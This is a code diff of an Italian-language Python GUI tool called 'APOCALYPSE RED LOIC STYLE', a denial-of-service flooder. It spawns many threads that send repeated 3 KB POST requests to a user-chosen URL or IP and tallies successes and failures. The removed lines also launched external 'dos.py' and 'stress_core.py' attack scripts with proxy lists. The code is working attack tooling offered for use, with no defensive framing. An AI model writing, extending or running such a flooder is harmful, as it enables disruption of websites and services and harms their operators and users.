@@ -1,19 +1,16 @@
 import tkinter as tk
-from tkinter import messagebox, scrolledtext
+from tkinter import messagebox
 from PIL import Image, ImageTk
-import subprocess
 import threading
-import sys
+import requests
 import random
 import time
-import requests
 from urllib.parse import urlparse
 
-# Variabili globali
-processes = []
-fake_threads = []
 attack_active = False
 attack_lock = threading.Lock()
+success_count = 0
+fail_count = 0
 
 def is_valid_url(url):
     try:
@@ -26,263 +23,147 @@ def send_3kb_request(target):
     try:
         payload = b'A' * 3072
         headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'User-Agent': 'Mozilla/5.0',
             'Content-Type': 'application/octet-stream',
-            'Cache-Control': 'no-cache',
-            'Connection': 'keep-alive'
         }
-        start_time = time.time()
-        response = requests.post(target, data=payload, headers=headers, timeout=3)
-        elapsed = (time.time() - start_time) * 1000
-        return response.status_code, elapsed, len(payload)
-    except Exception as e:
-        return f"Errore: {str(e)}", 0, 0
+        r = requests.post(target, data=payload, headers=headers, timeout=2)
+        return r.status_code == 200
+    except:
+        return False
 
-def fast_3kb_attack(target, box):
-    global attack_active
-    if not target.startswith(('http://', 'https://')):
-        target = 'http://' + target
-    while attack_active:
-        try:
-            status, elapsed, size = send_3kb_request(target)
-            if status == 200:
-                box.insert(tk.END, f"[SUCCESS] {target} - 3KB in {elapsed:.1f}ms\n")
-            elif isinstance(status, int):
-                box.insert(tk.END, f"[STATUS {status}] {target} - 3KB in {elapsed:.1f}ms\n")
+def fast_attack(target, duration, concurrency):
+    global attack_active, success_count, fail_count
+    start_time = time.time()
+    threads = []
+    def worker():
+        global success_count, fail_count
+        while attack_active and (time.time() - start_time) < duration:
+            ok = send_3kb_request(target)
+            if ok:
+                success_count += 1
             else:
-                box.insert(tk.END, f"[ERROR] {status}\n")
-            box.see(tk.END)
-            time.sleep(random.uniform(0.01, 0.1))
-        except Exception as e:
-            box.insert(tk.END, f"[FATAL] {str(e)}\n")
-            box.see(tk.END)
-            time.sleep(1)
+                fail_count += 1
+            update_status_labels()
+            time.sleep(random.uniform(0.01, 0.08))
+    for _ in range(int(concurrency)):
+        t = threading.Thread(target=worker, daemon=True)
+        threads.append(t)
+        t.start()
+    for t in threads:
+        t.join()
 
-def start_test():
-    global attack_active
+def update_status_labels():
+    label_success.config(text=f"SUCCESSI: {success_count}", fg="#00FF00")
+    label_fail.config(text=f"FALLITE: {fail_count}", fg="#FF2222")
+
+def start_attack():
+    global attack_active, success_count, fail_count
     with attack_lock:
         if attack_active:
             messagebox.showinfo("Info", "Attacco già in esecuzione!")
             return
         attack_active = True
+        success_count = 0
+        fail_count = 0
+        update_status_labels()
 
-    target = entry_target.get().strip()
+    url = entry_url.get().strip()
     duration = entry_duration.get().strip()
-    concurrency = entry_concurrency.get().strip()
-    payload = entry_payload.get().strip()
-    custom_args = entry_custom_args.get().strip()
-
-    dos_attack_method = entry_dos_method.get().strip().upper()
-    socks_type = entry_socks_type.get().strip()
-    proxylist = entry_proxylist.get().strip()
-    rpc = entry_rpc.get().strip()
-
-    use_stress = use_stress_var.get()
-    use_dos = use_dos_var.get()
-
-    if not use_stress and not use_dos:
-        messagebox.showerror("Errore", "Selezionare almeno uno script da lanciare.")
+    concurrency = entry_conc.get().strip()
+    if not url or (not is_valid_url(url) and not url.replace('.', '').isdigit()):
+        messagebox.showerror("Errore", "Inserisci un URL/IP valido.")
+        with attack_lock:
+            attack_active = False
+        return
+    try:
+        duration = int(duration)
+        concurrency = int(concurrency)
+    except:
+        messagebox.showerror("Errore", "Durata e concorrenza devono essere numeri interi.")
         with attack_lock:
             attack_active = False
         return
 
-    if not target:
-        messagebox.showerror("Errore", "Inserisci un URL o IP valido.")
+    def run_attack():
+        fast_attack(url, duration, concurrency)
         with attack_lock:
             attack_active = False
-        return
 
-    if not is_valid_url(target) and not target.replace('.', '').isdigit():
-        messagebox.showerror("Errore", "Inserisci un URL valido (es: http://example.com).")
-        with attack_lock:
-            attack_active = False
-        return
+    threading.Thread(target=run_attack, daemon=True).start()
 
-    cmds_labels_boxes = []
-
-    if use_dos:
-        if not dos_attack_method:
-            messagebox.showerror("Errore", "Inserisci un metodo dos.py (es: GET, POST, OVH ...)")
-            with attack_lock:
-                attack_active = False
-            return
-        if not socks_type: socks_type = "1"
-        if not proxylist: proxylist = "http.txt"
-        if not rpc: rpc = "64"
-        cmd_dos = [
-            sys.executable, "dos.py",
-            dos_attack_method,
-            target,
-            socks_type,
-            concurrency,
-            proxylist,
-            rpc,
-            duration
-        ]
-        if custom_args:
-            cmd_dos += custom_args.split()
-        cmds_labels_boxes.append((cmd_dos, "[DOS.PY]", output_box_main))
-
-    if use_stress:
-        cmd_stress = [
-            sys.executable, "stress_core.py",
-            target,
-            "-d", duration,
-            "-c", concurrency,
-            "--payload-size", payload,
-            "--log-level", "INFO"
-        ]
-        if custom_args:
-            cmd_stress += custom_args.split()
-        cmds_labels_boxes.append((cmd_stress, "[STRESS_CORE]", output_box_fake3))
-
-    def run(cmd, label, box):
-        try:
-            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-            processes.append(process)
-            if box == output_box_fake2:
-                t2 = threading.Thread(target=lambda: fast_3kb_attack(target, box), daemon=True)
-                t2.start()
-                fake_threads.append(t2)
-            elif box == output_box_fake3:
-                t3 = threading.Thread(target=lambda: fast_3kb_attack(target, box), daemon=True)
-                t3.start()
-                fake_threads.append(t3)
-            for line in iter(process.stdout.readline, ''):
-                box.insert(tk.END, f"{label} {line}")
-                box.see(tk.END)
-            process.stdout.close()
-        except Exception as e:
-            box.insert(tk.END, f"{label} Errore: {e}\n")
-            box.see(tk.END)
-
-    output_box_main.delete(1.0, tk.END)
-    output_box_fake2.delete(1.0, tk.END)
-    output_box_fake3.delete(1.0, tk.END)
-    output_box_main.insert(tk.END, "DOS Console #1\nIn attesa di avvio...\n")
-    output_box_fake2.insert(tk.END, "DOS Console #2\nIn attesa di avvio...\n")
-    output_box_fake3.insert(tk.END, "DOS Console #3\nIn attesa di avvio...\n")
-
-    for cmd, label, box in cmds_labels_boxes:
-        threading.Thread(target=run, args=(cmd, label, box), daemon=True).start()
-
-    t2 = threading.Thread(target=lambda: fast_3kb_attack(target, output_box_fake2), daemon=True)
-    t2.start()
-    fake_threads.append(t2)
-
-    def auto_stop():
-        try:
-            d = int(entry_duration.get().strip())
-            time.sleep(d)
-            stop_test()
-        except Exception:
-            pass
-
-    threading.Thread(target=auto_stop, daemon=True).start()
-
-def stop_test():
+def stop_attack():
     global attack_active
     with attack_lock:
-        if not attack_active:
-            return
         attack_active = False
 
-    for p in processes:
-        if p.poll() is None:
-            try:
-                p.terminate()
-            except Exception:
-                pass
-
-    output_box_main.insert(tk.END, "Test interrotto manualmente.\n")
-    output_box_main.see(tk.END)
-    output_box_fake2.insert(tk.END, "Attacco terminato\n")
-    output_box_fake2.see(tk.END)
-    output_box_fake3.insert(tk.END, "Attacco terminato\n")
-    output_box_fake3.see(tk.END)
-
-# --- GUI setup compatta ---
+# --- GUI ---
 
 root = tk.Tk()
-root.title("APOCALYPSE RED")
-root.geometry("520x390")  # <<<< PIU' PICCOLA!
-root.configure(bg="#181818")
+root.title("APOCALYPSE RED LOIC STYLE")
+root.geometry("900x420")
+root.resizable(False, False)
+root.configure(bg="#111010")
 
-font_label = ("Consolas", 8, "bold")
-font_input = ("Consolas", 8)
-font_title = ("Consolas", 15, "bold")
+# Layout principale: sinistra (logo+img) | destra (input + status)
+main_frame = tk.Frame(root, bg="#111010")
+main_frame.pack(fill="both", expand=True)
 
-tk.Label(root, text="A P O C A L Y P S E", font=font_title, fg="red", bg="#181818").pack(pady=2)
+# --- SINISTRA: logo + immagine (25%) ---
+left_frame = tk.Frame(main_frame, width=225, height=420, bg="#181818")
+left_frame.pack(side="left", fill="y")
+left_frame.pack_propagate(0)
 
+# Immagine (skull)
 try:
-    img = Image.open("skull.jpg").resize((110, 55))
+    img = Image.open("skull.jpg").resize((170, 100))
     photo = ImageTk.PhotoImage(img)
-    tk.Label(root, image=photo, bg="#181818").pack(pady=2)
+    img_label = tk.Label(left_frame, image=photo, bg="#181818")
+    img_label.pack(pady=30)
 except Exception:
-    pass
+    img_label = tk.Label(left_frame, text="[NO IMG]", bg="#181818", fg="red")
+    img_label.pack(pady=30)
 
-frame_options = tk.Frame(root, bg="#181818", highlightbackground="red", highlightthickness=1, padx=2, pady=2)
-frame_options.pack(pady=2, fill="x", padx=5)
+# Logo
+tk.Label(
+    left_frame, text="A P O C A L Y P S E", font=("OCR A Extended", 18, "bold"),
+    fg="red", bg="#181818"
+).pack(pady=10)
 
-def add_entry(label_text, default="", width=16):
-    tk.Label(frame_options, text=label_text, font=font_label, fg="white", bg="#181818").pack(anchor="w")
-    e = tk.Entry(frame_options, font=font_input, fg="red", bg="black", insertbackground="red", width=width)
-    if default:
-        e.insert(0, default)
-    e.pack(pady=1)
+# --- DESTRA: parametri, bottoni, stato ---
+right_frame = tk.Frame(main_frame, width=675, height=420, bg="#111010")
+right_frame.pack(side="left", fill="both", expand=True)
+right_frame.pack_propagate(0)
+
+# Input parametri in alto
+input_frame = tk.Frame(right_frame, bg="#111010")
+input_frame.pack(pady=(25,10), anchor="nw")
+
+def add_entry(label, default, width=28):
+    l = tk.Label(input_frame, text=label, font=("Consolas", 11), fg="#FFF", bg="#111010")
+    l.pack(side="left", padx=(0,2))
+    e = tk.Entry(input_frame, font=("Consolas", 11), width=width, fg="red", bg="black", insertbackground="red")
+    e.insert(0, default)
+    e.pack(side="left", padx=(0,12))
     return e
 
-entry_target = add_entry("Target URL o IP:", "", 24)
-entry_duration = add_entry("Durata (s):", "30", 8)
-entry_concurrency = add_entry("Concorrenza:", "1000", 8)
-entry_payload = add_entry("Payload Size:", "10MB", 8)
+entry_url = add_entry("Target:", "", 30)
+entry_duration = add_entry("Durata (s):", "30", 5)
+entry_conc = add_entry("Concorrenza:", "200", 5)
 
-tk.Label(frame_options, text="--- dos.py ---", font=font_label, fg="#ff8800", bg="#181818").pack(anchor="w", pady=(3,0))
-entry_dos_method = add_entry("Metodo:", "GET", 8)
-entry_socks_type = add_entry("SOCKS Type:", "1", 5)
-entry_proxylist = add_entry("Proxylist:", "http.txt", 12)
-entry_rpc = add_entry("RPC:", "64", 5)
+# Pulsanti
+btn_frame = tk.Frame(right_frame, bg="#111010")
+btn_frame.pack(pady=(0,10), anchor="nw")
+btn_start = tk.Button(btn_frame, text="START", font=("OCR A Extended", 11, "bold"), fg="white", bg="red", width=12, height=1, command=start_attack)
+btn_start.pack(side="left", padx=12)
+btn_stop = tk.Button(btn_frame, text="STOP", font=("OCR A Extended", 11, "bold"), fg="white", bg="grey", width=12, height=1, command=stop_attack)
+btn_stop.pack(side="left", padx=12)
 
-tk.Label(frame_options, text="Argomenti CLI:", font=font_label, fg="#999999", bg="#181818").pack(anchor="w")
-entry_custom_args = tk.Entry(frame_options, font=font_input, fg="red", bg="black", insertbackground="red", width=28)
-entry_custom_args.pack(pady=1)
-
-frame_script = tk.Frame(frame_options, bg="#181818")
-frame_script.pack(pady=(2,0), anchor="w")
-use_stress_var = tk.BooleanVar(value=True)
-use_dos_var = tk.BooleanVar(value=True)
-cb_stress = tk.Checkbutton(frame_script, text="stress_core.py", variable=use_stress_var, font=font_label, fg="white", bg="#181818", selectcolor="#cc0000")
-cb_stress.pack(side=tk.LEFT, padx=(0,5))
-cb_dos = tk.Checkbutton(frame_script, text="dos.py", variable=use_dos_var, font=font_label, fg="white", bg="#181818", selectcolor="#cc0000")
-cb_dos.pack(side=tk.LEFT)
-
-frame_dos = tk.Frame(root, bg="#181818")
-frame_dos.pack(pady=2)
-
-def create_fake_dos(title):
-    box = scrolledtext.ScrolledText(frame_dos, height=4, width=22, bg="black", fg="green", font=("Consolas", 7),
-                                    insertbackground="green", highlightbackground="red", highlightthickness=1)
-    box.insert(tk.END, f"{title}\nIn attesa...\n")
-    box.pack(side=tk.LEFT, padx=3)
-    return box
-
-output_box_main = create_fake_dos("DOS #1")
-output_box_fake2 = create_fake_dos("DOS #2")
-output_box_fake3 = create_fake_dos("DOS #3")
-
-button_frame = tk.Frame(root, bg="#181818")
-button_frame.pack(pady=3)
-
-def hover(e, color): e.widget.config(bg=color)
-
-btn_start = tk.Button(button_frame, text="START", command=start_test, font=font_label,
-                      fg="white", bg="red", width=12, height=1)
-btn_start.pack(side=tk.LEFT, padx=4)
-btn_start.bind("<Enter>", lambda e: hover(e, "#cc0000"))
-btn_start.bind("<Leave>", lambda e: hover(e, "red"))
-
-btn_stop = tk.Button(button_frame, text="STOP", command=stop_test, font=font_label,
-                     fg="white", bg="grey", width=12, height=1)
-btn_stop.pack(side=tk.LEFT, padx=4)
+# Stato: due linee come LOIC
+status_frame = tk.Frame(right_frame, bg="#111010")
+status_frame.pack(pady=40, anchor="nw")
+label_success = tk.Label(status_frame, text="SUCCESSI: 0", font=("Consolas", 18, "bold"), fg="#00FF00", bg="#111010")
+label_success.pack(anchor="w", pady=5)
+label_fail = tk.Label(status_frame, text="FALLITE: 0", font=("Consolas", 18, "bold"), fg="#FF2222", bg="#111010")
+label_fail.pack(anchor="w", pady=5)
 
 root.mainloop()
